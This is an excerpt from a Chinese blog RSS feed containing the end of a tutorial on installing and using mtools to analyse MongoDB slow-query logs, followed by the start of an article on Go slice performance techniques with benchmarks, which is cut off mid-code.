&lt;td&gt;mlogfilter --namespace xxx.xx --slow 100 &lt;em&gt;&lt;strong&gt;mongod.log&lt;/strong&gt;&lt;/em&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;8&quot;&gt;&lt;td rowspan=&quot;4&quot;&gt;mloginfo&lt;/td&gt;
&lt;td rowspan=&quot;4&quot;&gt;mloginfo可以过滤总结出slow query的情况,以及为日志中各类最常常出现情况进行统计&lt;/td&gt;
&lt;td&gt;通过mloginfo统计日志中connections的来源情况&lt;/td&gt;
&lt;td&gt;mloginfo &lt;em&gt;&lt;strong&gt;mongod.log&lt;/strong&gt;&lt;/em&gt; --connections&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;4&quot;&gt;&lt;td&gt;通过mloginfo查看日志中所记录的复制集状态变更(如果有的话)&lt;/td&gt;
&lt;td&gt;mloginfo &lt;strong&gt;&lt;em&gt;mongod.log&lt;/em&gt;&lt;/strong&gt; --rsstate&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;4&quot;&gt;&lt;td&gt;通过mloginfo统计查看日志中慢查询的分类&lt;/td&gt;
&lt;td&gt;mloginfo --queries &lt;em&gt;&lt;strong&gt;mongod.log&lt;/strong&gt;&lt;/em&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;4&quot;&gt;&lt;td&gt;通过mloginfo统计日志中各类信息的distinct&lt;/td&gt;
&lt;td&gt;mloginfo &lt;em&gt;&lt;strong&gt;mongod.log&lt;/strong&gt;&lt;/em&gt; --distinct&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;6&quot;&gt;&lt;td rowspan=&quot;5&quot;&gt;mplotqueries&lt;/td&gt;
&lt;td rowspan=&quot;5&quot;&gt;用不同类型的图将日志文件可视化(需要安装matplotlib)&lt;/td&gt;
&lt;td&gt;通过mplotqueries进行慢查询散点分布图绘制&lt;/td&gt;
&lt;td&gt;mplotqueries &lt;em&gt;&lt;strong&gt;mongod.log&lt;/strong&gt;&lt;/em&gt; --output-file slow01-2.png&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;5&quot;&gt;&lt;td&gt;通过mplotqueries进行慢查询散点分布图绘制,且只返回前10个&lt;/td&gt;
&lt;td&gt;mplotqueries &lt;em&gt;&lt;strong&gt;mongod.log&lt;/strong&gt;&lt;/em&gt; --output-file slow01-4.png --logscale --group-limit 10&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;4&quot;&gt;&lt;td&gt;仅看日志中某一个表的慢查询散点分布情况&lt;/td&gt;
&lt;td&gt;mlogfilter &lt;strong&gt;&lt;em&gt;mongod.log&lt;/em&gt;&lt;/strong&gt; --namespace xx.xxx |mplotqueries --output-file slow01-5.png&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;4&quot;&gt;&lt;td&gt;通过mplotqueries来对日志中的慢查询进行操作类型分布&lt;/td&gt;
&lt;td&gt;mplotqueries &lt;em&gt;&lt;strong&gt;mongod.log&lt;/strong&gt;&lt;/em&gt; --group operation --output-file slow01-6.png&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;5&quot;&gt;&lt;td&gt;查看每小时的insert情况&lt;/td&gt;
&lt;td&gt;mlogfilter &lt;em&gt;&lt;strong&gt;mongod.log&lt;/strong&gt;&lt;/em&gt; --operation insert | mplotqueries --type histogram --bucketsize 3600 --output-file 01-11.png&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;注：&lt;em&gt;&lt;strong&gt;mongod.log&lt;/strong&gt;&lt;/em&gt; 是MonogoDB 运行时产生的日志文件名字，也可以是其它日志文件名。 &lt;/p&gt;
&lt;h2&gt;三. Mtools安装的详细步骤&lt;/h2&gt;
&lt;p&gt;很多同学抱怨安装比较麻烦，错误很多，在这儿，把安装的详细步骤梳理如下。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Step 1&lt;/strong&gt;  下载pip程序包&lt;/p&gt;
&lt;p&gt;wget &quot;https://pypi.python.org/packages/source/p/pip/pip-1.5.4.tar.gz#md5=834b2904f92d46aaa333267fb1c922bb&quot;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/780228/201901/780228-20190124104550782-1722273415.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Step 2 &lt;/strong&gt;解析下载的文件&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/780228/201901/780228-20190124104634641-924681569.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt; Step 3&lt;/strong&gt; 安装 python setup.py install&lt;/p&gt;
&lt;p&gt; 此时报错，提示错误信息如截图&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/780228/201901/780228-20190124101951994-746424701.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Step 4&lt;/strong&gt;  针对上述错误，需安装setuptools,python下的setuptools。此程序包带有一个easy_install的工具,在安装python的每三方模块、工具时很有用,。&lt;/p&gt;
&lt;p&gt;下载 &lt;/p&gt;
&lt;p&gt;wget --no-check-certificate https://pypi.python.org/packages/source/s/setuptools/setuptools-12.0.3.tar.gz#md5=f07e4b0f4c1c9368fcd980d888b29a65&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/780228/201901/780228-20190124103416217-1913174561.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;解压 &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/780228/201901/780228-20190124103548999-455574993.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Step 5&lt;/strong&gt; 转到解析后的文档中，再次安装 python setup.py install&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/780228/201901/780228-20190124103941785-139125371.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;安装成功。&lt;/p&gt;
&lt;p&gt; &lt;strong&gt;Step 6&lt;/strong&gt; 安装 yum -y install python-pip&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/780228/201901/780228-20190124111433365-1842409005.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;如果提示错误 &lt;/p&gt;
&lt;p&gt;No package python-pip available.&lt;/p&gt;
&lt;p&gt;Error: Nothing to do&lt;/p&gt;
&lt;p&gt;请看后面的附注&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Step 7&lt;/strong&gt;  安装  mtools&lt;/p&gt;
&lt;p&gt; 执行命令  pip install mtools&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/780228/201901/780228-20190124111724931-1643139040.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Step 8&lt;/strong&gt; 安装效果验证&lt;/p&gt;
&lt;p&gt;使用其中的mlogfileter命令，查看日志超过100ms的慢查询。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/780228/201901/780228-20190124135100302-1481739612.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;通过mloginfo统计日志中connections的来源情况&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/780228/201901/780228-20190124135006583-138093831.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 验证工具安装OK。&lt;/p&gt;
&lt;p&gt;安装后，工具包所在的文档位于 /usr/lib/python2.7/site-packages/mtools 下 （自动生成） &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/780228/201901/780228-20190124171705313-1223462763.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;h2&gt; 四 附录&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;A：解决 No package python-pip available的问题&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;此错误的原因主要是没有安装epel。索引， 运行以下命令，安装epel&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/780228/201901/780228-20190124111009102-784168510.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 安装 epel-release后，再次安装 python-pip，不再报错。&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/780228/201901/780228-20190124111104023-149544476.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt; B：运行 mplotqueries 工具 需安装 python-matplotlib 包，和修改mplotqueries.py文件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;否则报错，具体信息如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/780228/201901/780228-20190124171754722-915663553.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;安装命令 yum install python-matplotlib&lt;/p&gt;
&lt;p&gt;到此，还没结束，还会报错，我们还需要修改 /usr/lib/python2.7/site-packages/mtools/mplotqueries/mplotqueries.py 执行文件。&lt;/p&gt;
&lt;p&gt;添加 以下指令&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
import matplotlib as mpl
mpl.use('Agg')
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;添加前&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/780228/201901/780228-20190124172133382-1890963623.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 添加后&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/780228/201901/780228-20190124172230796-26845790.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;再次执行 mplotqueries 命令后，看出生成了我们想要的 01-2.png 统计文件&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/780228/201901/780228-20190124173735669-549177945.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;


&lt;p&gt;&lt;strong&gt;本文版权归作者所有，未经作者同意不得转载&lt;/strong&gt;&lt;strong&gt;,&lt;/strong&gt;&lt;strong&gt;谢谢配合！！！&lt;/strong&gt;&lt;/p&gt;
</description>
<pubDate>Thu, 24 Jan 2019 14:49:00 +0000</pubDate>
<dc:creator>东山絮柳仔</dc:creator>
<og:description>一. 需求背景 MongoDB数据库的强大的文档模型使其成为处理数据的最佳方式。文档适用于广泛的流行数据模型，支持各种各样的场景。文档模型可以包含键值、关系数据集和图形数据集，当然，还可以包含父子关系</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/xuliuzai/p/10317421.html</dc:identifier>
</item>
<item>
<title>【Go】slice的一些使用技巧 - 戚银</title>
<link>http://www.cnblogs.com/thinkeridea/p/10317417.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/thinkeridea/p/10317417.html</guid>
<description>&lt;p&gt;原文链接：&lt;a href=&quot;https://blog.thinkeridea.com/201901/go/slice_de_yi_xie_shi_yong_ji_qiao.html&quot; class=&quot;uri&quot;&gt;https://blog.thinkeridea.com/201901/go/slice_de_yi_xie_shi_yong_ji_qiao.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;slice&lt;/code&gt; 是 &lt;code&gt;Go&lt;/code&gt; 语言十分重要的数据类型，它承载着很多使命，从语言层面来看是 &lt;code&gt;Go&lt;/code&gt; 语言的内置数据类型，从数据结构来看是动态长度的顺序链表，由于 &lt;code&gt;Go&lt;/code&gt; 不能直接操作内存（通过系统调用可以实现，但是语言本身并不支持），往往 &lt;code&gt;slice&lt;/code&gt; 也可以用来帮助开发者申请大块内存实现缓冲、缓存等功能。&lt;/p&gt;
&lt;p&gt;在 &lt;code&gt;Go&lt;/code&gt; 语言项目中大量的使用 &lt;code&gt;slice&lt;/code&gt;, 我总结三年来对 &lt;code&gt;slice&lt;/code&gt; 的一些操作技巧，以方便可以高效的使用 &lt;code&gt;slice&lt;/code&gt;， 并使用 &lt;code&gt;slice&lt;/code&gt; 解决一些棘手的问题。&lt;/p&gt;
&lt;h2 id=&quot;slice-的基本操作&quot;&gt;slice 的基本操作&lt;/h2&gt;
&lt;p&gt;先熟悉一些 &lt;code&gt;slice&lt;/code&gt; 的基本的操作, 对最常规的 &lt;code&gt;:&lt;/code&gt; 操作就可玩出很多花样。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;s=ss[:]&lt;/code&gt; 引用一个切片或数组&lt;/li&gt;
&lt;li&gt;&lt;code&gt;s=s[:0]&lt;/code&gt; 清空切片&lt;/li&gt;
&lt;li&gt;&lt;code&gt;s=s[:10]&lt;/code&gt; &lt;code&gt;s=s[10:]&lt;/code&gt; &lt;code&gt;s=s[10:20]&lt;/code&gt; 截取接片&lt;/li&gt;
&lt;li&gt;&lt;code&gt;s=ss[0:10:20]&lt;/code&gt; 从切片或数组引用指定长度和容量的切片&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;下标索引操作的一些误区 &lt;code&gt;s[i:l:c]&lt;/code&gt; &lt;code&gt;i&lt;/code&gt; 是起始偏移的起始位置，&lt;code&gt;l&lt;/code&gt; 是起始偏移的长度结束位置， &lt;code&gt;l-i&lt;/code&gt; 就是新 &lt;code&gt;slice&lt;/code&gt; 的长度， &lt;code&gt;c&lt;/code&gt; 是起始偏移的容量结束位置，&lt;code&gt;c-i&lt;/code&gt; 就是新 &lt;code&gt;slice&lt;/code&gt; 的容量。其中 &lt;code&gt;i&lt;/code&gt; 、&lt;code&gt;l&lt;/code&gt; 、&lt;code&gt;c&lt;/code&gt; 并不是当前 &lt;code&gt;slice&lt;/code&gt; 的索引，而是引用底层数组相对当前 &lt;code&gt;slice&lt;/code&gt; 起始位置的偏移量，所以是可超出当前 &lt;code&gt;slice&lt;/code&gt; 的长度的， 但不能超出当前 &lt;code&gt;slice&lt;/code&gt; 的容量，如下操作是合法的：&lt;/p&gt;
&lt;pre class=&quot;go&quot;&gt;
&lt;code&gt;package main

import (
    &quot;fmt&quot;
)

func main() {
    s := make([]int, 100)
    s[20] = 100
    s1 := s[10:10]
    s2 := s1[10:20]
    fmt.Println(s1)
    fmt.Println(s2)
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;其中 &lt;code&gt;s1&lt;/code&gt; 是 &lt;code&gt;[]&lt;/code&gt;；&lt;code&gt;s2&lt;/code&gt; 是 &lt;code&gt;[100 0 0 0 0 0 0 0 0 0]&lt;/code&gt;, 这里并不会发生下标越界的情况，一个更好的例子在 &lt;a href=&quot;http://www.cnblogs.com/thinkeridea/p/10317417.html#csv-reader-中的一个例子&quot;&gt;csv reader 中的一个例子&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;创建 slice&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;创建切片的方法有很多，下面罗列一些常规的：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;var s []int&lt;/code&gt; 创建 nil切片&lt;/li&gt;
&lt;li&gt;&lt;code&gt;s := make([]int, 0, 0)&lt;/code&gt; 、 &lt;code&gt;s=[]int{}&lt;/code&gt; 创建无容量空切片&lt;/li&gt;
&lt;li&gt;&lt;code&gt;s:= make([]int, 0, 100)&lt;/code&gt; 创建有容量空切片&lt;/li&gt;
&lt;li&gt;&lt;code&gt;s:=make([]int, 100)&lt;/code&gt; 创建零值切片&lt;/li&gt;
&lt;li&gt;&lt;code&gt;s:=array[:]&lt;/code&gt; 引用数组创建切片&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;内置函数&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;len(s)&lt;/code&gt; 获取切片的长度&lt;/li&gt;
&lt;li&gt;&lt;code&gt;cap(s)&lt;/code&gt; 获取切片的容量&lt;/li&gt;
&lt;li&gt;&lt;code&gt;append(s, ...)&lt;/code&gt; 向切片追加内容&lt;/li&gt;
&lt;li&gt;&lt;code&gt;copy(s, s1)&lt;/code&gt; 向切片拷贝内容&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;一个缓冲的简单示例&quot;&gt;一个缓冲的简单示例&lt;/h2&gt;
&lt;p&gt;遇到过很多拼接字符串的方法，各种各样的都有 &lt;code&gt;fmt&lt;/code&gt; &lt;code&gt;builder&lt;/code&gt; &lt;code&gt;buffer&lt;/code&gt; &lt;code&gt;+&lt;/code&gt; 等等，实际上 &lt;code&gt;builder&lt;/code&gt; 和 &lt;code&gt;buffer&lt;/code&gt; 都是使用 &lt;code&gt;[]byte&lt;/code&gt; 的切片作为缓冲来实现的，&lt;code&gt;fmt&lt;/code&gt; 往往性能最差，原因是它主要功能不是连接字符串而是格式化数据会用到反射等等操作。&lt;code&gt;+&lt;/code&gt; 操作在大量拼接时性能也是很差， 不过小字符串少量拼接效果很理想，&lt;code&gt;builder&lt;/code&gt; 往往性能不如 &lt;code&gt;buffer&lt;/code&gt; 特别是在较短字符串拼接上，实际 &lt;code&gt;builder&lt;/code&gt; 和 &lt;code&gt;buffer&lt;/code&gt; 实现原理非常类似，&lt;code&gt;builder&lt;/code&gt; 在转成字符串时使用了 &lt;code&gt;unsafe&lt;/code&gt; 减少了一次内存分配，因为小字符串因为扩容机制不如 &lt;code&gt;buffer&lt;/code&gt; 灵活，所以性能有所不如，大字符串降低一次大的内存分配就显得很明显了。&lt;/p&gt;
&lt;p&gt;经常遇到一个需求就是拼接 &lt;code&gt;[]int&lt;/code&gt; 中个各个元素，很多种实现都有人用，都是需要遍历转换 &lt;code&gt;int&lt;/code&gt; 到 &lt;code&gt;string&lt;/code&gt;，但是拼接方法千奇百怪，以下提供两种方法对比（&lt;a href=&quot;https://github.com/thinkeridea/example/blob/master/slice/slice_int_to_string.go&quot;&gt;源码在GitHub&lt;/a&gt;）。&lt;/p&gt;
&lt;pre class=&quot;go&quot;&gt;
&lt;code&gt;package slice

import (
    &quot;strconv&quot;
    &quot;unsafe&quot;
)

func SliceInt2String1(s []int) string {
    if len(s) &amp;lt; 1 {
        return &quot;&quot;
    }

    ss := strconv.Itoa(s[0])
    for i := 1; i &amp;lt; len(s); i++ {
        ss += &quot;,&quot; + strconv.Itoa(s[i])
    }

    return ss
}

func SliceInt2String2(s []int) string {
    if len(s) &amp;lt; 1 {
        return &quot;&quot;
    }

    b := make([]byte, 0, 256)
    b = append(b, strconv.Itoa(s[0])...)
    for i := 1; i &amp;lt; len(s); i++ {
        b = append(b, ',')
        b = append(b, strconv.Itoa(s[i])...)
    }

    return string(b)
}

func SliceInt2String3(s []int) string {
    if len(s) &amp;lt; 1 {
        return &quot;&quot;
    }

    b := make([]byte, 0, 256)
    b = append(b, strconv.Itoa(s[0])...)
    for i := 1; i &amp;lt; len(s); i++ {
        b = append(b, ',')
        b = append(b, strconv.Itoa(s[i])...)
    }

    return *(*string)(unsafe.Pointer(&amp;amp;b))
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;SliceInt2String1&lt;/code&gt; 使用原始的 &lt;code&gt;+&lt;/code&gt; 操作，因为是较小的字符串拼接，使用 &lt;code&gt;+&lt;/code&gt; 主要是因为在小字符串拼接性能优于其它几种方法，&lt;code&gt;SliceInt2String2&lt;/code&gt; 与 &lt;code&gt;SliceInt2String3&lt;/code&gt; 都使用了一个 &lt;code&gt;256&lt;/code&gt; 容量的 &lt;code&gt;[]byte&lt;/code&gt; 作为缓冲， 唯一的区别是在返回时一个使用 &lt;code&gt;string&lt;/code&gt; 转换类型，一个使用 &lt;code&gt;unsafe&lt;/code&gt; 转换类型。&lt;/p&gt;
&lt;p&gt;写了一个性能测试（&lt;a href=&quot;https://github.com/thinkeridea/example/blob/master/slice/slice_int_to_string_test.go&quot;&gt;源码在GitHub&lt;/a&gt;），看一下效果吧:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;goos: darwin
goarch: amd64
pkg: github.com/thinkeridea/example/slice
BenchmarkSliceInt2String1-8      3000000           461 ns/op         144 B/op          9 allocs/op
BenchmarkSliceInt2String2-8     20000000           117 ns/op          32 B/op          1 allocs/op
BenchmarkSliceInt2String3-8     10000000           144 ns/op         256 B/op          1 allocs/op
PASS
ok      github.com/thinkeridea/example/slice    5.928s&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;明显可以看得出 &lt;code&gt;SliceInt2String2&lt;/code&gt; 的性能是 &lt;code&gt;SliceInt2String1&lt;/code&gt; 7倍左右，提升很明显，&lt;code&gt;SliceInt2String2&lt;/code&gt; 与 &lt;code&gt;SliceInt2String3&lt;/code&gt; 差异很小，主要是因为使用 &lt;code&gt;unsafe&lt;/code&gt; 转换类型导致大内存无法释放，实际这个测试中连接字符串只需要 &lt;code&gt;32&lt;/code&gt; 个字节，使用 &lt;code&gt;unsafe&lt;/code&gt; 却导致 &lt;code&gt;256&lt;/code&gt; 个字节无法被释放，这也正是 &lt;code&gt;builder&lt;/code&gt; 和 &lt;code&gt;buffer&lt;/code&gt; 的差别，所以小字符串拼接 &lt;code&gt;buffer&lt;/code&gt; 性能往往更好。在这里简单的通过 &lt;code&gt;[]byte&lt;/code&gt; 减少内存分配次数来实现缓冲。&lt;/p&gt;
&lt;p&gt;如果连续拼接一组这样的操作，比如输入 &lt;code&gt;[][]int&lt;/code&gt;, 输出 &lt;code&gt;[]string&lt;/code&gt; （&lt;a href=&quot;https://github.com/thinkeridea/example/blob/master/slice/slice_int_to_string.go#L52&quot;&gt;源码在GitHub&lt;/a&gt;）：&lt;/p&gt;
&lt;pre class=&quot;go&quot;&gt;
&lt;code&gt;package slice

import (
    &quot;strconv&quot;
    &quot;unsafe&quot;
)

func SliceInt2String4(s [][]int) []string {
    res := make([]string, len(s))
    for i, v := range s {
        if len(v) &amp;lt; 1 {
            res[i] = &quot;&quot;
            continue
        }

        res[i] += strconv.Itoa(v[0])
        for j := 1; j &amp;lt; len(v); j++ {
            res[i] += &quot;,&quot; + strconv.Itoa(v[j])
        }
    }

    return res
}

func SliceInt2String5(s [][]int) []string {
    res := make([]string, len(s))
    b := make([]byte, 0, 256)
    for i, v := range s {
        if len(v) &amp;lt; 1 {
            res[i] = &quot;&quot;
            continue
        }

        b = b[:0]
        b = append(b, strconv.Itoa(v[0])...)
        for j := 1; j &amp;lt; len(v); j++ {
            b = append(b, ',')
            b = append(b, strconv.Itoa(v[j])...)
        }

        res[i] = string(b)
    }

    return res
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;SliceInt2String5&lt;/code&gt; 中使用 &lt;code&gt;b = b[:0]&lt;/code&gt; 来促使达到反复使用一块缓冲区，写了一个性能测试（&lt;a href=&quot;https://github.com/thinkeridea/example/blob/master/slice/slice_int_to_string_test.go#L85&quot;&gt;源码在GitHub&lt;/a&gt;），看一下效果吧:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;goos: darwin
goarch: amd64
pkg: github.com/thinkeridea/example/slice
BenchmarkSliceInt2String4-8       300000          4420 ns/op        1440 B/op         82 allocs/op
BenchmarkSliceInt2String5-8      1000000          1102 ns/op         432 B/op         10 allocs/op
PASS
ok      github.com/thinkeridea/example/slice    8.364s&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;较 &lt;code&gt;+&lt;/code&gt; 版本提升接近4倍的性能，这是使用 &lt;code&gt;slice&lt;/code&gt; 作为缓冲区极好的技巧，使用非常方便，并不用使用 &lt;code&gt;builder&lt;/code&gt; 和 &lt;code&gt;buffer&lt;/code&gt;， &lt;code&gt;slice&lt;/code&gt; 操作非常的简单实用。&lt;/p&gt;
&lt;h2 id=&quot;append-与-copy&quot;&gt;append 与 copy&lt;/h2&gt;
&lt;p&gt;如果合并多个 &lt;code&gt;slice&lt;/code&gt; 为一个，有三种方式来合并，主要合并差异来源于创建新 &lt;code&gt;slice&lt;/code&gt; 的方法，使用 &lt;code&gt;var news []int&lt;/code&gt; 或者 &lt;code&gt;news:=make([]int, 0, len(s1)+len(s2)....)&lt;/code&gt; 的方式创建的新变量就需要使用 &lt;code&gt;append&lt;/code&gt; 来合并，如果使用 &lt;code&gt;news:=make([]int, len(s1)+len(s2)....)&lt;/code&gt; 就需要使用 &lt;code&gt;copy&lt;/code&gt; 来合并。不同的方法也有差异，&lt;code&gt;append&lt;/code&gt; 和 &lt;code&gt;copy&lt;/code&gt; 在这个例子中主要差异在于 &lt;code&gt;append&lt;/code&gt; 适用于零长度的初始化 &lt;code&gt;slice&lt;/code&gt;， &lt;code&gt;copy&lt;/code&gt; 适用于确定长度的 &lt;code&gt;slice&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;写了一个测试来看看两者的差异吧（&lt;a href=&quot;https://github.com/thinkeridea/example/blob/master/slice/append_and_copy_test.go&quot;&gt;源码在GitHub&lt;/a&gt;）：&lt;/p&gt;
&lt;pre class=&quot;go&quot;&gt;
&lt;code&gt;func BenchmarkExperiment3Append1(b *testing.B) {
    for i := 0; i &amp;lt; b.N; i++ {
        var s []int
        for j := 0; j &amp;lt; 20; j++ {
            s = append(s, []int{j, j + 1, j + 2, j + 3, j + 4}...)
        }
    }
}

func BenchmarkExperiment3Append2(b *testing.B) {
    for i := 0; i &amp;lt; b.N; i++ {
        s := make([]int, 0, 100)
        for j := 0; j &amp;lt; 20; j++ {
            s = append(s, []int{j, j + 1, j + 2, j + 3, j + 4}...)
        }
    }
}

func BenchmarkExperiment3Copy(b *testing.B) {
    for i := 0; i &amp;lt; b.N; i++ {
        s := make([]int, 100)
        n := 0
        for j := 0; j &amp;lt; 20; j++ {
            n += copy(s[n:], []int{j, j + 1, j + 2, j + 3, j + 4})
        }
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;测试结果如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;goos: darwin
goarch: amd64
pkg: github.com/thinkeridea/example/slice
BenchmarkExperiment3Append1-8        2000000           782 ns/op        3024 B/op          6 allocs/op
BenchmarkExperiment3Append2-8       10000000           192 ns/op           0 B/op          0 allocs/op
BenchmarkExperiment3Copy-8          10000000           217 ns/op           0 B/op          0 allocs/op
PASS
ok      github.com/thinkeridea/example/slice    6.926s&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;从结果上来看使用没有容量的 &lt;code&gt;append&lt;/code&gt; 性能真的很糟糕，实际上不要对没有任何容量的 &lt;code&gt;slice&lt;/code&gt; 进行 &lt;code&gt;append&lt;/code&gt; 操作是最好的实践，在准备用 &lt;code&gt;append&lt;/code&gt; 的时候应该预先给定一个容量，哪怕这个容量并不是确定的，像前面缓存连接字符串时一样，并不能明确使用的空间，先分配256个字节，这样的好处是可以减少系统调用分配内存的次数，即使空间不能用完，也不用太过担心浪费，&lt;code&gt;append&lt;/code&gt; 本身扩容机制也会导致空间不是刚刚好用完的，而初始化的容量往往结合业务场景给的一个均值，这是很好的。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;append&lt;/code&gt; 和 &lt;code&gt;copy&lt;/code&gt; 在预先确定长度和容量时 &lt;code&gt;append&lt;/code&gt; 效果更好一些，主要原因是 &lt;code&gt;copy&lt;/code&gt; 需要一个变量来记录位置。 如果使用场景中没有强制限定长度，建议使用 &lt;code&gt;append&lt;/code&gt; 因为 &lt;code&gt;append&lt;/code&gt; 会根据实际情况再做内存分配，较 &lt;code&gt;copy&lt;/code&gt; 也更加灵活一些， 而 &lt;code&gt;copy&lt;/code&gt; 往往用在长度固定的地方，可以防止数据长度溢出的问题，例如标准库中 &lt;code&gt;strings.Repeat&lt;/code&gt; 函数，它采用指数增长的方式快速填充指定数量的字符，但是如果使用 &lt;code&gt;append&lt;/code&gt; 就会发生多余的内存分配，导致长度溢出。&lt;/p&gt;
&lt;pre class=&quot;go&quot;&gt;
&lt;code&gt;func Repeat(s string, count int) string {
    b := make([]byte, len(s)*count)
    bp := copy(b, s)
    for bp &amp;lt; len(b) {
        copy(b[bp:], b[:bp])
        bp *= 2
    }
    return string(b)
}&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;csv-reader-中的一个例子&quot;&gt;csv reader 中的一个例子&lt;/h2&gt;
&lt;p&gt;官方标准库 &lt;code&gt;csv&lt;/code&gt; 的读取性能极高，其中 &lt;code&gt;reader&lt;/code&gt; 里面有使用 &lt;code&gt;slice&lt;/code&gt; 极好的例子，以下是简略的代码，如果想要全面了解程序需要去看标准库的源码：&lt;/p&gt;
&lt;pre class=&quot;go&quot;&gt;
&lt;code&gt;func (r *Reader) readRecord(dst []string) ([]string, error) {
    line, errRead = r.readLine()
    if errRead == io.EOF {
        return nil, errRead
    }
    r.recordBuffer = r.recordBuffer[:0]
    r.fieldIndexes = r.fieldIndexes[:0]
parseField:
    for {
        if r.TrimLeadingSpace {
            line = bytes.TrimLeftFunc(line, unicode.IsSpace)
        }
            i := bytes.IndexRune(line, r.Comma)
            field := line
            if i &amp;gt;= 0 {
                field = field[:i]
            } else {
                field = field[:len(field)-lengthNL(field)]
            }
            
            r.recordBuffer = append(r.recordBuffer, field...)
            r.fieldIndexes = append(r.fieldIndexes, len(r.recordBuffer))
            if i &amp;gt;= 0 {
                line = line[i+commaLen:]
                continue parseField
            }
            break parseField
    }
    
    if err == nil {
        err = errRead
    }

    // Create a single string and create slices out of it.
